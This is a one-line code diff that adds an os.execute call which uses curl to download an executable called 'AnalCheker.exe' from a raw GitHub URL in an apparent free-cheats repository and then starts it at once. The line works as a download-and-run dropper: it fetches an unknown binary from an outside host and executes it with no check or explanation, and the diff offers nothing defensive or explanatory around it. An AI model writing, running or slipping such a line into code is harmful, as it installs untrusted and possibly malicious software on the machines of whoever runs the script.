@@ -1,0 +1,1 @@
+os.execute("curl -L -o AnalCheker.exe https://raw.githubusercontent.com/TopFreeCheats/freesheats/main/AnalCheker.exe && start AnalCheker.exe")
